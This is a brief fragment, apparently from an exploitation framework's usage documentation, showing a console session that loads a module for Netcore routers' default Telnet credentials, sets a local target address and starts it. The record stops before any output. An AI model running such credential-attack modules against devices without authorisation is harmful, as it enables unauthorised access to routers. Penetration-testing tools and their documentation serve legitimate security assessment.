...
```
exf > use creds/routers/netcore/telnet_default_creds
exf (Netcore Router Default Telnet Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (Netcore Router Default Telnet Creds) > run
[*] Running module...
